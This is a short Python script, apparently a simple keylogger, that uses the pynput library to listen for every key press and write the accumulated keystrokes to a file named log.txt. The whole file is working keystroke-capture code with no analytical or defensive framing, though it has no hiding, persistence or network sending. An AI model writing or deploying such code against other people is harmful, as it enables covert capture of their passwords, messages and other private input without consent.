import pynput
from pynput.keyboard import Key, Listener

keys = [] #this list will have all the keys

### a function to add the key pressed to the list #####
def on_press(key):
    
    keys.append(key)
    write_file(keys)

#### a function to write the log in a .txt file ########
def write_file(keys):
    
    with open('log.txt', 'w') as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")
            elif key == Key.backspace or key == Key.shift or key == Key.ctrl_l:
                f.write("")
            else:
                k = str(key).replace("'", "")
                f.write(k)
        
with Listener(on_press = on_press) as listener:
    listener.join()
